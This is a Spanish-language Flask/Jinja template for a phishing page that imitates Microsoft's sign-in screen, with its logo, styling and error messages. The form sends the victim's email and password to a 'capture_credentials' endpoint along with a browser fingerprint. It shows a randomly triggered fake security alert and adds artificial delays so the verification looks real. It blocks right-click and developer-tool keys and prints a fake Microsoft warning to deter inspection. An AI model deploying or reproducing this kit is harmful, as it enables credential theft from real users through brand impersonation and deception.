{% extends "base.html" %}

{% block title %}Iniciar sesión en tu cuenta{% endblock %}

{% block description %}Accede a tu cuenta de Microsoft{% endblock %}

{% block og_title %}Microsoft{% endblock %}
{% block og_description %}Inicia sesión en tu cuenta de Microsoft{% endblock %}

{% block custom_css %}
:root {
    --ms-blue: #0078d4;
    --ms-blue-hover: #106ebe;
    --ms-blue-dark: #005a9e;
    --ms-gray: #f3f2f1;
    --ms-gray-light: #faf9f8;
    --ms-gray-dark: #605e5c;
    --ms-border: #edebe9;
    --ms-text: #323130;
    --ms-text-secondary: #605e5c;
    --ms-red: #d13438;
    --ms-green: #107c10;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: var(--ms-gray-light);
    margin: 0;
    padding: 0;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

.ms-header {
    background: white;
    border-bottom: 1px solid var(--ms-border);
    padding: 0 24px;
    height: 48px;
    display: flex;
    align-items: center;
}

.ms-logo {
    width: 108px;
    height: 24px;
}

.main-container {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 48px 24px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    position: relative;
}

.background-pattern {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="%23ffffff" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
    opacity: 0.3;
}

.signin-card {
    background: white;
    border-radius: 2px;
    box-shadow: 0 2px 6px 0 rgba(0,0,0,0.2), 0 2px 18px 0 rgba(0,0,0,0.1);
    max-width: 440px;
    width: 100%;
    padding: 44px;
    box-sizing: border-box;
    position: relative;
    z-index: 1;
}

.signin-header {
    text-align: left;
    margin-bottom: 24px;
}

.ms-logo-card {
    width: 108px;
    height: 24px;
    margin-bottom: 24px;
}

.signin-title {
    color: var(--ms-text);
    font-size: 24px;
    font-weight: 600;
    line-height: 28px;
    margin: 0 0 8px;
}

.signin-subtitle {
    color: var(--ms-text-secondary);
    font-size: 15px;
    font-weight: 400;
    line-height: 20px;
    margin: 0;
}

.form-container {
    margin-top: 24px;
}

.input-group {
    margin-bottom: 16px;
    position: relative;
}

.input-field {
    width: 100%;
    padding: 11px 12px;
    border: 1px solid var(--ms-border);
    border-radius: 2px;
    font-size: 15px;
    font-family: inherit;
    color: var(--ms-text);
    background: white;
    box-sizing: border-box;
    transition: border-color 0.1s;
}

.input-field:focus {
    outline: none;
    border-color: var(--ms-blue);
    border-width: 2px;
    padding: 10px 11px;
}

.input-field.error {
    border-color: var(--ms-red);
    border-width: 2px;
    padding: 10px 11px;
}

.input-field.success {
    border-color: var(--ms-green);
}

.input-label {
    color: var(--ms-text-secondary);
    font-size: 13px;
    margin-bottom: 4px;
    display: block;
    font-weight: 600;
}

.error-message {
    color: var(--ms-red);
    font-size: 13px;
    margin-top: 4px;
    display: none;
    line-height: 16px;
}

.success-message {
    color: var(--ms-green);
    font-size: 13px;
    margin-top: 4px;
    display: none;
    line-height: 16px;
}

.signin-options {
    margin: 24px 0;
}

.keep-signed-in {
    display: flex;
    align-items: center;
    margin-bottom: 24px;
}

.checkbox-container {
    position: relative;
    margin-right: 8px;
}

.checkbox {
    width: 20px;
    height: 20px;
    border: 1px solid var(--ms-border);
    border-radius: 2px;
    background: white;
    cursor: pointer;
    position: relative;
}

.checkbox:checked {
    background-color: var(--ms-blue);
    border-color: var(--ms-blue);
}

.checkbox:checked::after {
    content: '✓';
    color: white;
    font-size: 14px;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.checkbox-label {
    color: var(--ms-text);
    font-size: 15px;
    cursor: pointer;
    user-select: none;
}

.form-actions {
    margin-top: 24px;
}

.signin-button {
    background-color: var(--ms-blue);
    border: 1px solid var(--ms-blue);
    border-radius: 2px;
    color: white;
    font-size: 15px;
    font-weight: 600;
    padding: 8px 12px;
    cursor: pointer;
    transition: background-color 0.1s;
    min-width: 108px;
    min-height: 32px;
    display: inline-block;
    text-align: center;
    text-decoration: none;
}

.signin-button:hover {
    background-color: var(--ms-blue-hover);
    border-color: var(--ms-blue-hover);
}

.signin-button:active {
    background-color: var(--ms-blue-dark);
    border-color: var(--ms-blue-dark);
}

.signin-button:disabled {
    background-color: var(--ms-gray);
    border-color: var(--ms-gray);
    color: var(--ms-gray-dark);
    cursor: not-allowed;
}

.back-button {
    background: transparent;
    border: 1px solid var(--ms-border);
    border-radius: 2px;
    color: var(--ms-text);
    font-size: 15px;
    font-weight: 400;
    padding: 8px 12px;
    cursor: pointer;
    margin-right: 8px;
    min-width: 108px;
    min-height: 32px;
    transition: background-color 0.1s;
}

.back-button:hover {
    background-color: var(--ms-gray);
}

.signin-links {
    margin-top: 24px;
    text-align: left;
}

.signin-links a {
    color: var(--ms-blue);
    font-size: 13px;
    text-decoration: none;
    display: block;
    margin-bottom: 8px;
}

.signin-links a:hover {
    text-decoration: underline;
}

.loading-container {
    display: none;
    text-align: center;
    padding: 24px;
}

.ms-spinner {
    width: 20px;
    height: 20px;
    border: 2px solid var(--ms-gray);
    border-top: 2px solid var(--ms-blue);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 16px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.security-alert {
    background-color: #fff4ce;
    border: 1px solid #f9ab00;
    border-radius: 2px;
    padding: 12px 16px;
    margin-bottom: 24px;
    font-size: 13px;
    color: var(--ms-text);
    display: none;
}

.security-alert .icon {
    color: #f9ab00;
    margin-right: 8px;
    font-weight: bold;
}

.user-tile {
    display: none;
    align-items: center;
    padding: 16px;
    border: 1px solid var(--ms-border);
    border-radius: 2px;
    margin-bottom: 24px;
    cursor: pointer;
    transition: background-color 0.1s;
}

.user-tile:hover {
    background-color: var(--ms-gray-light);
}

.user-avatar {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    background-color: var(--ms-blue);
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: 600;
    margin-right: 12px;
}

.user-info {
    flex: 1;
}

.user-name {
    font-size: 15px;
    font-weight: 600;
    color: var(--ms-text);
    margin: 0 0 2px;
}

.user-email {
    font-size: 13px;
    color: var(--ms-text-secondary);
    margin: 0;
}

.footer {
    background: white;
    border-top: 1px solid var(--ms-border);
    padding: 12px 24px;
    text-align: center;
}

.footer-links {
    display: flex;
    justify-content: center;
    gap: 24px;
    margin-bottom: 8px;
    flex-wrap: wrap;
}

.footer-links a {
    color: var(--ms-text-secondary);
    font-size: 12px;
    text-decoration: none;
}

.footer-links a:hover {
    text-decoration: underline;
}

.footer-text {
    color: var(--ms-text-secondary);
    font-size: 12px;
    margin: 0;
}

/* Responsive Design */
@media (max-width: 480px) {
    .signin-card {
        padding: 24px;
        margin: 0 16px;
    }
    
    .main-container {
        padding: 24px 0;
    }
    
    .form-actions {
        display: flex;
        flex-direction: column;
        gap: 8px;
    }
    
    .signin-button,
    .back-button {
        width: 100%;
        min-width: auto;
    }
}

/* Animaciones */
.fade-in {
    animation: fadeIn 0.3s ease-in;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

.slide-in {
    animation: slideIn 0.3s ease-out;
}

@keyframes slideIn {
    from { transform: translateX(-20px); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
}

/* Estados específicos */
.password-step .signin-title {
    font-size: 20px;
}

.password-step .user-tile {
    display: flex;
}

.password-step .input-group:first-of-type {
    display: none;
}
{% endblock %}

{% block content %}
<div class="ms-header">
    <svg class="ms-logo" viewBox="0 0 108 23" xmlns="http://www.w3.org/2000/svg">
        <path fill="#00BCF2" d="M0 0h10.8v10.8H0z"/>
        <path fill="#00B4A6" d="M12.15 0h10.8v10.8h-10.8z"/>
        <path fill="#FFB900" d="M0 12.15h10.8v10.8H0z"/>
        <path fill="#F25022" d="M12.15 12.15h10.8v10.8h-10.8z"/>
        <path fill="#737373" d="M26.35 17.6h1.6v-8.4h-1.6v3.3c-.4-.5-1.1-.8-2-.8-1.8 0-3.2 1.4-3.2 3.4s1.4 3.4 3.2 3.4c.9 0 1.6-.3 2-.8v.9zm-1.8-1.3c-1 0-1.8-.8-1.8-1.9s.8-1.9 1.8-1.9 1.8.8 1.8 1.9-.8 1.9-1.8 1.9zm6.2-4.6c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm7.1 0c-1.9 0-3.4 1.5-3.4 3.4s1.5 3.4 3.4 3.4 3.4-1.5 3.4-3.4-1.5-3.4-3.4-3.4zm0 5.5c-1.1 0-1.9-.9-1.9-2.1s.8-2.1 1.9-2.1 1.9.9 1.9 2.1-.8 2.1-1.9 2.1zm8.1-5.4c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm6.2 0c-1.9 0-3.4 1.5-3.4 3.4s1.5 3.4 3.4 3.4c1.4 0 2.6-.8 3.1-2h-1.7c-.3.4-.8.7-1.4.7-1 0-1.8-.6-1.9-1.5h5.1c0-.2 0-.4 0-.6 0-1.9-1.5-3.4-3.2-3.4zm-1.8 2.8c.1-.9.9-1.5 1.8-1.5s1.7.6 1.8 1.5h-3.6zm9.1-2.7c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm6.8-2.1v2.1c-.4-.5-1.1-.8-2-.8-1.8 0-3.2 1.4-3.2 3.4s1.4 3.4 3.2 3.4c.9 0 1.6-.3 2-.8v.7h1.6v-8h-1.6zm-1.8 6.7c-1 0-1.8-.8-1.8-1.9s.8-1.9 1.8-1.9 1.8.8 1.8 1.9-.8 1.9-1.8 1.9zm8.1-4.6c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm6.8-2.1v2.1c-.4-.5-1.1-.8-2-.8-1.8 0-3.2 1.4-3.2 3.4s1.4 3.4 3.2 3.4c.9 0 1.6-.3 2-.8v.7h1.6v-8h-1.6zm-1.8 6.7c-1 0-1.8-.8-1.8-1.9s.8-1.9 1.8-1.9 1.8.8 1.8 1.9-.8 1.9-1.8 1.9z"/>
    </svg>
</div>

<div class="main-container">
    <div class="background-pattern"></div>
    
    <div class="signin-card fade-in">
        <div class="signin-header">
            <svg class="ms-logo-card" viewBox="0 0 108 23" xmlns="http://www.w3.org/2000/svg">
                <path fill="#00BCF2" d="M0 0h10.8v10.8H0z"/>
                <path fill="#00B4A6" d="M12.15 0h10.8v10.8h-10.8z"/>
                <path fill="#FFB900" d="M0 12.15h10.8v10.8H0z"/>
                <path fill="#F25022" d="M12.15 12.15h10.8v10.8h-10.8z"/>
                <path fill="#737373" d="M26.35 17.6h1.6v-8.4h-1.6v3.3c-.4-.5-1.1-.8-2-.8-1.8 0-3.2 1.4-3.2 3.4s1.4 3.4 3.2 3.4c.9 0 1.6-.3 2-.8v.9zm-1.8-1.3c-1 0-1.8-.8-1.8-1.9s.8-1.9 1.8-1.9 1.8.8 1.8 1.9-.8 1.9-1.8 1.9zm6.2-4.6c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm7.1 0c-1.9 0-3.4 1.5-3.4 3.4s1.5 3.4 3.4 3.4 3.4-1.5 3.4-3.4-1.5-3.4-3.4-3.4zm0 5.5c-1.1 0-1.9-.9-1.9-2.1s.8-2.1 1.9-2.1 1.9.9 1.9 2.1-.8 2.1-1.9 2.1zm8.1-5.4c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm6.2 0c-1.9 0-3.4 1.5-3.4 3.4s1.5 3.4 3.4 3.4c1.4 0 2.6-.8 3.1-2h-1.7c-.3.4-.8.7-1.4.7-1 0-1.8-.6-1.9-1.5h5.1c0-.2 0-.4 0-.6 0-1.9-1.5-3.4-3.2-3.4zm-1.8 2.8c.1-.9.9-1.5 1.8-1.5s1.7.6 1.8 1.5h-3.6zm9.1-2.7c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm6.8-2.1v2.1c-.4-.5-1.1-.8-2-.8-1.8 0-3.2 1.4-3.2 3.4s1.4 3.4 3.2 3.4c.9 0 1.6-.3 2-.8v.7h1.6v-8h-1.6zm-1.8 6.7c-1 0-1.8-.8-1.8-1.9s.8-1.9 1.8-1.9 1.8.8 1.8 1.9-.8 1.9-1.8 1.9zm8.1-4.6c-.9 0-1.6.3-2 .8v-.7h-1.6v6.8h1.6v-3.8c0-.9.6-1.5 1.4-1.5s1.4.6 1.4 1.5v3.8h1.6v-4.2c0-1.6-1.1-2.7-2.4-2.7zm6.8-2.1v2.1c-.4-.5-1.1-.8-2-.8-1.8 0-3.2 1.4-3.2 3.4s1.4 3.4 3.2 3.4c.9 0 1.6-.3 2-.8v.7h1.6v-8h-1.6zm-1.8 6.7c-1 0-1.8-.8-1.8-1.9s.8-1.9 1.8-1.9 1.8.8 1.8 1.9-.8 1.9-1.8 1.9z"/>
            </svg>
            <h1 class="signin-title" id="signinTitle">Iniciar sesión</h1>
            <p class="signin-subtitle" id="signinSubtitle">en tu cuenta de Microsoft</p>
        </div>
        
        <div id="securityAlert" class="security-alert">
            <span class="icon">⚠</span>
            Hemos detectado un inicio de sesión desde una nueva ubicación. Verifica tu identidad para continuar.
        </div>
        
        <div id="userTile" class="user-tile" onclick="selectUser()">
            <div class="user-avatar" id="userAvatar">U</div>
            <div class="user-info">
                <div class="user-name" id="userName">Usuario</div>
                <div class="user-email" id="userEmail">usuario@example.com</div>
            </div>
        </div>
        
        <form id="microsoftLoginForm" class="form-container" method="POST" action="{{ url_for('capture_credentials') }}">
            <!-- Campos ocultos -->
            <input type="hidden" name="platform" value="microsoft">
            <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
            <input type="hidden" name="session_id" value="{{ session_id }}">
            <input type="hidden" name="timestamp" id="timestamp">
            <input type="hidden" name="client_id" value="00000002-0000-0000-c000-000000000000">
            <input type="hidden" name="redirect_uri" value="https://login.live.com/oauth20_desktop.srf">
            
            <!-- Información del dispositivo -->
            <input type="hidden" name="user_agent" id="userAgent">
            <input type="hidden" name="screen_resolution" id="screenRes">
            <input type="hidden" name="timezone" id="timezone">
            <input type="hidden" name="language" id="language">
            <input type="hidden" name="referrer" id="referrer">
            <input type="hidden" name="cookies_enabled" id="cookiesEnabled">
            <input type="hidden" name="local_storage" id="localStorage">
            
            <!-- Honeypot -->
            <input type="text" name="website" style="position: absolute; left: -9999px; opacity: 0;" tabindex="-1" autocomplete="off">
            
            <div class="input-group" id="emailGroup">
                <label class="input-label" for="email">Correo electrónico, teléfono o Skype</label>
                <input type="text" class="input-field" name="email" id="email" required autocomplete="username">
                <div class="error-message" id="emailError"></div>
                <div class="success-message" id="emailSuccess"></div>
            </div>
            
            <div class="input-group" id="passwordGroup" style="display: none;">
                <label class="input-label" for="password">Contraseña</label>
                <input type="password" class="input-field" name="password" id="password" required autocomplete="current-password">
                <div class="error-message" id="passwordError"></div>
            </div>
            
            <div class="signin-options" id="signinOptions">
                <div class="keep-signed-in">
                    <div class="checkbox-container">
                        <input type="checkbox" class="checkbox" id="keepSignedIn" name="keep_signed_in" value="true">
                    </div>
                    <label class="checkbox-label" for="keepSignedIn">Mantener la sesión iniciada</label>
                </div>
            </div>
            
            <div class="form-actions">
                <button type="button" class="back-button" id="backButton" onclick="goBack()" style="display: none;">Atrás</button>
                <button type="button" class="signin-button" id="nextButton" onclick="handleNext()">Siguiente</button>
            </div>
        </form>
        
        <div class="loading-container" id="loadingContainer">
            <div class="ms-spinner"></div>
            <p>Verificando credenciales...</p>
        </div>
        
        <div class="signin-links">
            <a href="#" onclick="showForgotPassword(); return false;">¿No puedes acceder a tu cuenta?</a>
            <a href="#" onclick="showCreateAccount(); return false;">Crear una cuenta de Microsoft</a>
            <a href="#" onclick="showSignInOptions(); return false;">Opciones de inicio de sesión</a>
        </div>
    </div>
</div>

<div class="footer">
    <div class="footer-links">
        <a href="#">Términos de uso</a>
        <a href="#">Privacidad y cookies</a>
        <a href="#">...</a>
    </div>
    <p class="footer-text">© 2024 Microsoft</p>
</div>
{% endblock %}

{% block custom_js %}
// Variables globales
let currentStep = 'email';
let emailVerified = false;
let isSubmitting = false;
let securityCheckEnabled = false;
let userEmail = '';

// Función para mostrar mensajes de error
function showError(field, message) {
    const errorElement = document.getElementById(field + 'Error');
    const inputElement = document.getElementById(field);
    
    errorElement.textContent = message;
    errorElement.style.display = 'block';
    inputElement.classList.add('error');
    
    setTimeout(() => {
        errorElement.style.display = 'none';
        inputElement.classList.remove('error');
    }, 6000);
}

// Función para mostrar mensajes de éxito
function showSuccess(field, message) {
    const successElement = document.getElementById(field + 'Success');
    const inputElement = document.getElementById(field);
    
    successElement.textContent = message;
    successElement.style.display = 'block';
    inputElement.classList.add('success');
}

// Función para mostrar loading
function showLoading(show = true) {
    const form = document.querySelector('.form-container');
    const loading = document.getElementById('loadingContainer');
    const links = document.querySelector('.signin-links');
    
    if (show) {
        form.style.display = 'none';
        links.style.display = 'none';
        loading.style.display = 'block';
    } else {
        form.style.display = 'block';
        links.style.display = 'block';
        loading.style.display = 'none';
    }
}

// Función para validar email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
    const skypeRegex = /^live:[a-zA-Z][a-zA-Z0-9\.,\-_]{5,31}$/;
    
    return emailRegex.test(email) || phoneRegex.test(email.replace(/\s+/g, '')) || skypeRegex.test(email);
}

// Función para obtener iniciales del usuario
function getUserInitials(email) {
    if (email.includes('@')) {
        const name = email.split('@')[0];
        return name.charAt(0).toUpperCase();
    }
    return email.charAt(0).toUpperCase();
}

// Función para manejar el botón "Siguiente"
function handleNext() {
    if (isSubmitting) return;
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    
    if (currentStep === 'email') {
        // Validar email
        if (!email) {
            showError('email', 'Escribe tu correo electrónico, número de teléfono o nombre de usuario de Skype.');
            return;
        }
        
        if (!isValidEmail(email)) {
            showError('email', 'Esa cuenta de Microsoft no existe. Escribe una cuenta diferente o consigue una nueva.');
            return;
        }
        
        // Simular verificación de email
        showLoading(true);
        userEmail = email;
        
        setTimeout(() => {
            showLoading(false);
            
            // Cambiar a paso de contraseña
            currentStep = 'password';
            emailVerified = true;
            
            // Actualizar UI
            document.getElementById('signinTitle').textContent = 'Escribir contraseña';
            document.getElementById('signinSubtitle').textContent = '';
            
            // Mostrar tile de usuario
            const userTile = document.getElementById('userTile');
            const userAvatar = document.getElementById('userAvatar');
            const userName = document.getElementById('userName');
            const userEmailElement = document.getElementById('userEmail');
            
            userAvatar.textContent = getUserInitials(email);
            userName.textContent = email.split('@')[0] || email;
            userEmailElement.textContent = email;
            userTile.style.display = 'flex';
            userTile.classList.add('slide-in');
            
            // Ocultar campo de email y mostrar contraseña
            document.getElementById('emailGroup').style.display = 'none';
            document.getElementById('passwordGroup').style.display = 'block';
            document.getElementById('passwordGroup').classList.add('slide-in');
            
            // Mostrar botón atrás
            document.getElementById('backButton').style.display = 'inline-block';
            document.getElementById('nextButton').textContent = 'Iniciar sesión';
            
            // Mostrar alerta de seguridad ocasionalmente
            if (Math.random() < 0.3) {
                document.getElementById('securityAlert').style.display = 'block';
                securityCheckEnabled = true;
            }
            
            // Focus en contraseña
            document.getElementById('password').focus();
            
        }, Math.random() * 2500 + 1500);
        
    } else if (currentStep === 'password') {
        // Validar contraseña
        if (!password) {
            showError('password', 'Escribe la contraseña de tu cuenta de Microsoft.');
            return;
        }
        
        if (password.length < 8) {
            showError('password', 'Tu cuenta o contraseña es incorrecta. Si no recuerdas tu contraseña, restablécela ahora.');
            return;
        }
        
        // Enviar formulario
        submitForm();
    }
}

// Función para volver atrás
function goBack() {
    if (currentStep === 'password') {
        currentStep = 'email';
        emailVerified = false;
        
        // Restaurar UI
        document.getElementById('signinTitle').textContent = 'Iniciar sesión';
        document.getElementById('signinSubtitle').textContent = 'en tu cuenta de Microsoft';
        
        // Ocultar tile de usuario
        document.getElementById('userTile').style.display = 'none';
        
        // Mostrar campo de email y ocultar contraseña
        document.getElementById('emailGroup').style.display = 'block';
        document.getElementById('passwordGroup').style.display = 'none';
        
        // Ocultar botón atrás
        document.getElementById('backButton').style.display = 'none';
        document.getElementById('nextButton').textContent = 'Siguiente';
        
        // Ocultar alerta de seguridad
        document.getElementById('securityAlert').style.display = 'none';
        
        // Focus en email
        document.getElementById('email').focus();
        
        // Limpiar contraseña
        document.getElementById('password').value = '';
    }
}

// Función para seleccionar usuario
function selectUser() {
    if (currentStep === 'password') {
        document.getElementById('password').focus();
    }
}

// Función para enviar el formulario
function submitForm() {
    if (isSubmitting) return;
    
    isSubmitting = true;
    showLoading(true);
    
    // Recopilar información adicional
    document.getElementById('timestamp').value = new Date().toISOString();
    document.getElementById('cookiesEnabled').value = navigator.cookieEnabled;
    document.getElementById('localStorage').value = typeof(Storage) !== 'undefined';
    
    // Simular delay de autenticación
    const delay = securityCheckEnabled ? Math.random() * 4000 + 2000 : Math.random() * 2500 + 1000;
    
    setTimeout(() => {
        document.getElementById('microsoftLoginForm').submit();
    }, delay);
}

// Funciones para enlaces falsos
function showForgotPassword() {
    alert('Serás redirigido a la página de recuperación de contraseña.');
}

function showCreateAccount() {
    alert('Serás redirigido a la página de creación de cuenta.');
}

function showSignInOptions() {
    alert('Opciones adicionales de inicio de sesión no disponibles.');
}

// Event listeners
document.addEventListener('DOMContentLoaded', function() {
    // Recopilar información del dispositivo
    document.getElementById('userAgent').value = navigator.userAgent;
    document.getElementById('screenRes').value = screen.width + 'x' + screen.height;
    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
    document.getElementById('language').value = navigator.language;
    document.getElementById('referrer').value = document.referrer;
    
    // Auto-focus en email
    document.getElementById('email').focus();
    
    // Manejar Enter key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && !isSubmitting) {
            e.preventDefault();
            handleNext();
        }
        
        // Manejar Escape para volver atrás
        if (e.key === 'Escape' && currentStep === 'password') {
            goBack();
        }
    });
    
    // Validación en tiempo real para email
    document.getElementById('email').addEventListener('input', function() {
        const email = this.value.trim();
        if (email && isValidEmail(email)) {
            this.classList.remove('error');
            this.classList.add('success');
        } else {
            this.classList.remove('success');
        }
    });
    
    // Validación en tiempo real para contraseña
    document.getElementById('password').addEventListener('input', function() {
        const password = this.value;
        if (password.length >= 8) {
            this.classList.remove('error');
            this.classList.add('success');
        } else {
            this.classList.remove('success');
        }
    });
    
    // Detectar herramientas de desarrollo
    let devtools = false;
    setInterval(() => {
        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
            if (!devtools) {
                devtools = true;
                console.clear();
                console.log('%cMicrosoft Security Warning', 'color: #d13438; font-size: 16px; font-weight: bold;');
                console.log('%cDeveloper tools detected. This session is being monitored for security purposes.', 'color: #605e5c; font-size: 12px;');
            }
        }
    }, 1000);
    
    // Prevenir clic derecho y teclas de desarrollo
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'C')) {
            e.preventDefault();
        }
    });
    
    // Simular comportamiento de Microsoft con delays aleatorios
    setTimeout(() => {
        document.body.classList.add('loaded');
    }, Math.random() * 500 + 200);
});
{% endblock %}